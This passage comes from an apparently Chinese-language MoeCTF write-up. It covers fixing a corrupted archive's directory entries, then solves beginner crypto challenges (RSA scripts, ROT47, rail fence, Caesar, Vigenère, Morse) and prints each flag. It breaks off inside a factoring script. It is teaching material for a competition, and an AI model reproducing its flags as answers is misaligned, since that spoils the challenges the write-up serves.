&lt;p&gt;此时会发现 dirEntry[9] 的 deFileNameLength 为 0，需要先将它修改为 &lt;code&gt;6&lt;&#x2F;code&gt; ，再去修改文件名， deFileNameLength 的修改可以参照上面的 dirEntry[8]。&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;writeup.owo.show&#x2F;~gitbook&#x2F;image?url=https%3A%2F%2F1538376902-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FP93uXUpqRmANvc0oiUrO%252Fuploads%252FzzTqVK5EnoJcwz62d15j%252Fweird_package-5.png%3Falt%3Dmedia%26token%3Da1a5de1d-917c-4f38-9a28-7e006c662e09&amp;amp;width=768&amp;amp;dpr=4&amp;amp;quality=100&amp;amp;sign=fc4468e52b62b3817bfe0651e6bc0a60a3a46c5021a5e6d0f69275675d700365&quot; alt=&quot;img&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;修复好后，可以点击上图红色箭头所指向的按钮点击重新运行模板，就可以看到 deFileName 被正确修改为 &lt;code&gt;3&#x2F;9999&lt;&#x2F;code&gt; 了，并且 endLocator 也正确的出现了（好欸）。&lt;&#x2F;p&gt;
&lt;p&gt;之后就是解压得到了 9 个文件，通过 CyberChef 来找 flag 的时候到了，经过一个一个试可以发现 &lt;code&gt;1111&lt;&#x2F;code&gt; 到 &lt;code&gt;8888&lt;&#x2F;code&gt; 得到的都是假的 flag &lt;code&gt;moectf{wow_tHis_is_a_faKe_fLaG_HaHaHa_S66ilDMV3DciYf!lP0iYlJf!M3rux9G9V}&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;writeup.owo.show&#x2F;~gitbook&#x2F;image?url=https%3A%2F%2F1538376902-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FP93uXUpqRmANvc0oiUrO%252Fuploads%252F9t2Aarxd9a70zqfCv5ED%252Fweird_package-6.png%3Falt%3Dmedia%26token%3Da46188ad-8c8b-4acd-9cfc-ef831b37f166&amp;amp;width=768&amp;amp;dpr=4&amp;amp;quality=100&amp;amp;sign=22e3fac8c1585c8decec43c48ba54e7e72dde05139a1fce15ebda42d0d73fc8a&quot; alt=&quot;img&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;只有 &lt;code&gt;9999&lt;&#x2F;code&gt; 才是真的，flag 如下&lt;&#x2F;p&gt;
&lt;p&gt;Copy&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;moectf{WHaT_DiD_You_Do_To_THe_arcHive?_!lP0iYlJf!M3rux9G9Vf!JoxiMl903ll}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;h2 id=&quot;crypto&quot;&gt;Crypto&lt;a class=&quot;zola-anchor&quot; href=&quot;#crypto&quot; aria-label=&quot;Anchor link for: crypto&quot; style=&quot;visibility: hidden;&quot;&gt;&lt;&#x2F;a&gt;
&lt;&#x2F;h2&gt;
&lt;h3 id=&quot;ru-men-zhi-bei-2&quot;&gt;入门指北&lt;a class=&quot;zola-anchor&quot; href=&quot;#ru-men-zhi-bei-2&quot; aria-label=&quot;Anchor link for: ru-men-zhi-bei-2&quot; style=&quot;visibility: hidden;&quot;&gt;&lt;&#x2F;a&gt;
&lt;&#x2F;h3&gt;
&lt;p&gt;Copy&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;import gmpy2
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;from Crypto.Util.number import *
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;p = 0xe82a76eeb5ac63e054128e040171630b993feb33e0d3d38fbb7c0b54df3a2fb9b5589d1205e0e4240b8fcb4363acaa4c3c44dd6e186225ebf3ce881c7070afa7
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;q = 0xae5c2e450dbce36c8d6d1a5c989598fc01438f009f9b4c29352d43fd998d10984d402637d7657d772fb9f5e4f4feee63b267b401b67704979d519ad7f0a044eb
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;c = 0x4016bf1fe655c863dd6c08cbe70e3bb4e6d4feefacaaebf1cfa2a8d94051d21e51919ea754c1aa7bd1674c5330020a99e2401cb1f232331a2da61cb4329446a17e3b9d6b59e831211b231454e81cc8352986e05d44ae9fcd30d68d0ce288c65e0d22ce0e6e83122621d2b96543cec4828f590af9486aa57727c5fcd8e74bd296
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;e = 65537
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;n = p * q
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;phi = (p - 1) * (q - 1)
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;d = gmpy2.invert(e, phi)
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;m = pow(c, d, n)
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;print(long_to_bytes(m))
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;# moectf{weLCome_To_moeCTf_CRypTo_And_enjoy_THis_gAme!_THis_is_yoUR_fLAg!}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;h3 id=&quot;bad-e&quot;&gt;bad_E&lt;a class=&quot;zola-anchor&quot; href=&quot;#bad-e&quot; aria-label=&quot;Anchor link for: bad-e&quot; style=&quot;visibility: hidden;&quot;&gt;&lt;&#x2F;a&gt;
&lt;&#x2F;h3&gt;
&lt;p&gt;Copy&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;import gmpy2
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;from Crypto.Util.number import long_to_bytes
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;from gmpy2 import invert
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;p = 6853495238262155391975011057929314523706159020478084061020122347902601182448091015650787022962180599741651597328364289413042032923330906135304995252477571
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;q = 11727544912613560398705401423145382428897876620077115390278679983274961030035884083100580422155496261311510530671232666801444557695190734596546855494472819
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;c = 63388263723813143290256836284084914544524440253054612802424934400854921660916379284754467427040180660945667733359330988361620691457570947823206385692232584893511398038141442606303536260023122774682805630913037113541880875125504376791939861734613177272270414287306054553288162010873808058776206524782351475805
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;e = 65537
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;n = p * q
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;phi = (p - 1) * (q - 1)
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;print(gmpy2.gcd(e, p - 1))
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;print(gmpy2.gcd(e, q - 1))
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;d = invert(e, q - 1)
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;print(long_to_bytes(pow(c, d, q)))
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;# moectf{N0w_Y0U_hAve_kN0w_h0w_rsA_w0rks!_f!lP0iYlJf!M3ru}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;h3 id=&quot;ezrot&quot;&gt;ezrot&lt;a class=&quot;zola-anchor&quot; href=&quot;#ezrot&quot; aria-label=&quot;Anchor link for: ezrot&quot; style=&quot;visibility: hidden;&quot;&gt;&lt;&#x2F;a&gt;
&lt;&#x2F;h3&gt;
&lt;p&gt;Copy&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;@64E7LC@Ecf0:D0;FDE020D:&amp;gt;!=60=6EE6C0DF3DE:EFE:@?04:!96C0tsAJdEA6d;F}%0N
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Rot47 解码可以得到 flag 如下&lt;&#x2F;p&gt;
&lt;p&gt;Copy&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;moectf{rot47_is_just_a_simPle_letter_substitution_ciPher_EDpy5tpe5juNT_}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;h3 id=&quot;ke-ke-de-xin-wei-qiang&quot;&gt;可可的新围墙&lt;a class=&quot;zola-anchor&quot; href=&quot;#ke-ke-de-xin-wei-qiang&quot; aria-label=&quot;Anchor link for: ke-ke-de-xin-wei-qiang&quot; style=&quot;visibility: hidden;&quot;&gt;&lt;&#x2F;a&gt;
&lt;&#x2F;h3&gt;
&lt;p&gt;猜测是栅栏解密，密文如下&lt;&#x2F;p&gt;
&lt;p&gt;Copy&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;mt3_hsTal3yGnM_p3jocfFn3cp3_hFs3c_3TrB__i3_uBro_lcsOp}e{ciri_hT_avn3Fa_j
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;通过设置栏数为 3 可以得到 flag 如下&lt;&#x2F;p&gt;
&lt;p&gt;Copy&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;moectf{F3nc3_ciph3r_shiFTs_3ach_l3TT3r_By_a_Giv3n_nuMB3r_oF_plac3s_Ojpj}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;h3 id=&quot;huang-di-de-xin-mi-ma&quot;&gt;皇帝的新密码&lt;a class=&quot;zola-anchor&quot; href=&quot;#huang-di-de-xin-mi-ma&quot; aria-label=&quot;Anchor link for: huang-di-de-xin-mi-ma&quot; style=&quot;visibility: hidden;&quot;&gt;&lt;&#x2F;a&gt;
&lt;&#x2F;h3&gt;
&lt;p&gt;猜测是凯撒密码，密文如下&lt;&#x2F;p&gt;
&lt;p&gt;Copy&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;tvljam{JhLzhL_JPwoLy_Pz_h_cLyF_zPtwPL_JPwoLy!_ZmUVUA40q5KbEQZAK5Ehag4Av}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;设置为 7 可以得到 flag 如下&lt;&#x2F;p&gt;
&lt;p&gt;Copy&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;moectf{CaEsaE_CIphEr_Is_a_vErY_sImpIE_CIphEr!_SfNONT40j5DuXJSTD5Xatz4To}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;h3 id=&quot;bu-shi-huang-di-de-xin-mi-ma&quot;&gt;不是“皇帝的新密码”&lt;a class=&quot;zola-anchor&quot; href=&quot;#bu-shi-huang-di-de-xin-mi-ma&quot; aria-label=&quot;Anchor link for: bu-shi-huang-di-de-xin-mi-ma&quot; style=&quot;visibility: hidden;&quot;&gt;&lt;&#x2F;a&gt;
&lt;&#x2F;h3&gt;
&lt;blockquote&gt;
&lt;p&gt;https:&#x2F;&#x2F;www.dcode.fr&#x2F;vigenere-cipher&lt;&#x2F;p&gt;
&lt;&#x2F;blockquote&gt;
&lt;p&gt;维吉尼亚密码解密&lt;&#x2F;p&gt;
&lt;p&gt;moectf{vIgENErE_CIphEr_Is_a_lIttlE_hardEr_thaN_caEsar_CIphEr_4u4u4EXfXz}&lt;&#x2F;p&gt;
&lt;h3 id=&quot;mao-yan-miao-yu&quot;&gt;猫言喵语&lt;a class=&quot;zola-anchor&quot; href=&quot;#mao-yan-miao-yu&quot; aria-label=&quot;Anchor link for: mao-yan-miao-yu&quot; style=&quot;visibility: hidden;&quot;&gt;&lt;&#x2F;a&gt;
&lt;&#x2F;h3&gt;
&lt;p&gt;先利用空格分割字符串&lt;&#x2F;p&gt;
&lt;p&gt;Copy&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;喵喵？
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;喵喵喵喵喵喵喵喵喵喵喵喵
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;喵喵喵
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;喵喵喵喵喵喵喵喵？喵喵？喵喵喵喵喵？
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;喵喵？喵喵喵喵喵？
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;喵喵喵喵喵？
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;喵喵喵喵喵？喵喵？
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;喵喵喵喵喵？
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;喵喵喵喵喵喵
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;喵喵喵喵喵喵
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;喵喵喵喵喵喵喵喵？喵喵？喵喵喵喵喵？
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;喵喵？喵喵喵喵喵？喵喵喵
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;喵喵喵喵喵？
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;喵喵？
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;喵喵喵喵喵喵喵喵？喵喵？喵喵喵喵喵？
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;喵喵？喵喵喵喵喵喵喵喵喵
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;喵喵喵喵喵喵喵喵？
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;喵喵？
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;喵喵喵喵喵喵喵喵？喵喵？喵喵喵喵喵？
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;喵喵？喵喵喵喵喵喵喵喵喵
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;喵喵喵
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;喵喵喵喵喵喵喵喵？喵喵？喵喵喵喵喵？
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;喵喵？喵喵喵喵喵？喵喵喵
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;喵喵喵喵喵？
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;喵喵喵喵喵？喵喵喵喵喵喵
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;喵喵喵喵喵？喵喵喵喵喵喵
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;喵喵喵
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;喵喵？喵喵喵喵喵喵
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;喵喵喵喵喵喵喵喵？喵喵？喵喵喵喵喵？
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;喵喵？喵喵？喵喵喵
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;喵喵？喵喵？喵喵？
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;喵喵喵喵喵喵喵喵？
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;喵喵？喵喵？喵喵喵喵喵喵
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;喵喵喵喵喵喵
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;喵喵喵喵喵喵喵喵？喵喵？喵喵喵喵喵？
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;喵喵？喵喵喵喵喵喵喵喵喵
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;喵喵？喵喵喵喵喵？喵喵？
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;喵喵喵喵喵喵喵喵？喵喵？喵喵喵喵喵？
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;喵喵喵喵喵？喵喵喵
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;喵喵？喵喵喵喵喵喵喵喵？
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;把 &lt;code&gt;喵喵？&lt;&#x2F;code&gt; 换成 &lt;code&gt;-&lt;&#x2F;code&gt; ，把 &lt;code&gt;喵喵喵&lt;&#x2F;code&gt; 换乘 &lt;code&gt;.&lt;&#x2F;code&gt; ，可以得到以下内容&lt;&#x2F;p&gt;
&lt;p&gt;Copy&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;-
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;....
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;.
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;..--.-
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;-.-
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;.-
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;.--
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;.-
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;..
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;..
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;..--.-
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;-.-.
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;.-
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;-
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;..--.-
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;-...
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;..-
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;-
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;..--.-
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;-...
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;.
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;..--.-
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;-.-.
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;.-
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;.-..
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;.-..
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;.
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;-..
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;..--.-
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;--.
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;---
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;..-
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;--..
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;..
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;..--.-
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;-...
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;-.--
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;..--.-
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;.-.
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;-..-
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;用摩斯密码解码可以得到 flag 如下&lt;&#x2F;p&gt;
&lt;p&gt;Copy&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;moectf{THE_KAWAII_CAT_BUT_BE_CALLED_GOUZI_BY_RX}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;h3 id=&quot;factor-signin&quot;&gt;factor_signin&lt;a class=&quot;zola-anchor&quot; href=&quot;#factor-signin&quot; aria-label=&quot;Anchor link for: factor-signin&quot; style=&quot;visibility: hidden;&quot;&gt;&lt;&#x2F;a&gt;
&lt;&#x2F;h3&gt;
&lt;p&gt;Copy&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;import gmpy2
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;from Crypto.Util.number import long_to_bytes, bytes_to_long
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;from gmpy2 import gcd
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;p1 = 18055722101348711626577381571859114850735298658417345663254295930584841136416234624852520581982069555948490061840244710773146585295336094872892685938420880462305333393436098181186277450475949236132458958671804132443554885896037342335902958516394876382378829317303693655605215373555988755516058130500801822723195474873517960624159417903134580987202400855946137101429970119186394052011747475879598126195607938106163892658285305921071673588966184054026228745012993740035399652049777986535759039077634555909031397541116025395236871778797949216479130412500655359057128438928721459688727543057760739527720641179290282309741
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;q1 = 19024691283015651666032297670418553586155390575928421823630922553034857624430114628839720683172187406577114034710093054198921843669645736474448836706112221787749688565566635453151716934583685087745112614898780150391513798368931496744574075511968933800467288441832780919514199410584786925010518564670786685241724643282580795568609339268652910564215887176803735675069372979560024792322029911970574914829712553975379661212645059271137916107885326625543090473004683836665262304916304580076748336858662108554591235698235221618061328251985929904075811056422186525179189846420226944944513865790999242309352900287977666792901
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;e = 65537
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;c1 =  10004937130983861141937782436252502991050957330184611684406783226971057978666503675149401388381995491152372622456604317681236160071166819028679754762162125904637599991943368450200313304999566592294442696755822585022667008378021280392976010576970877334159755332946926433635584313137140987588847077645814987268595739733550220882135750267567373532603503399428451548677091911410732474324157868011686641243202218731844256789044721309478991918322850448456919991540932206923861653518190974620161055008847475600980152660468279765607319838003177639654115075183493029803981527882155542925959658123816315099271123470754815045214896642428657264709805029840253303446203030294879166242867850331945166255924821406218090304893024711068773287842075208409312312188560675094244318565148284432361706108491327014254387317744284876018328591380705408407853404828189643214087638328376675071962141118973835178054884474523241911240926274907256651801384433652425740230755811160476356172444327762497910600719286629420662696949923799255603628210458906831175806791599965316549386396788014703044837917283461862338269599464440202019922379625071512100821922879623930069349084917919100015782270736808388388006084027673781004085620817521378823838335749279055639005125
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;c2 = 4948422459907576438725352912593232312182623872749480015295307088166392790756090961680588458629287353136729331282506869598853654959933189916541367579979613191505226006688017103736659670745715837820780269669982614187726024837483992949073998289744910800139692315475427811724840888983757813069849711652177078415791290894737059610056340691753379065563574279210755232749774749757141836708161854072798697882671844015773796030086898649043727563289757423417931359190238689436180953442515869613672008678717039516723747808793079592658069533269662834322438864456440701995249381880745586708718334052938634931936240736457181295
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;n1 = 343504538870081878757729748260620800783581983635281373321527119223374418103340873199654926888439040391545101913132680017655039577253974802351999985470115474655124168592386965001556620077117966153475518658881140827499124290142523464795351995478153288872749817655925271395693435582010998996210909883510311066017237567799370371513462802547313382594409676803895262837061350017911885033133654781876923251129406855067993830824618637981136966134029212516871210627954762147349788788999116702635535406398258621926040887099782494271000823401788337120154104692934583729065189687995570122890809807661370008740283447636580308161498808092269041815719148127168137018600113465985504975054319601741498799761500526467431533990903047624407330243357514588557352746347337683868781554819821575385685459666842162355673947984514687068626166144076257334426612302554448774082488600083569900006274897032242821388126274957846236552373226099112200392102883351088570736254707966329366625911183721875374731791052229266503696334310835323523568132399330263642353927504971311717117370721838701629885670598853025212521537158141447625623337563164790788106598854822686494249848796441153496412236527242235888308435573209980270776407776277489669763803746640746378181948641
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;n2 = 8582505375542551134698364096640878629785534004976071646505285128223700755811329156276289439920192196962008222418309136528180402357612976316670896973298407081310073283979903409463559102445223030866575563539261326076167685019121804961393115251287057504682389257841337573435085535013992761172452417731887700665115563173984357419855481847035192853387338980937451843809282267888616833734087813693242841580644645315837196205981207827105545437201799441352173638172133698491126291396194764373021523547130703629001683366722885529834956411976212381935354905525700646776572036418453784898084635925476199878640087165680193737
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;factors = [
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    18106525049998616747,
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    15211380502610462057,
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    17093292308638969889,
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    12404642343676224637,
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    14397830993057803133,
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    11092420583960163379,
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    14619040595108594017,
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    14745811312384518031,
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    13645878578452317313,
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    16870346804576162551,
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    12034779627328165471,
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    15175734709842430433,
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    14678737767649343977,
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    17289161209347211817,
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    10049235158029375571,
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    15332916111580607077,
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    18345408081492711641,
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    17543713628803023199,
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    11853704782834170959,
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    9949603102225364603,
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    13062839684118954553,
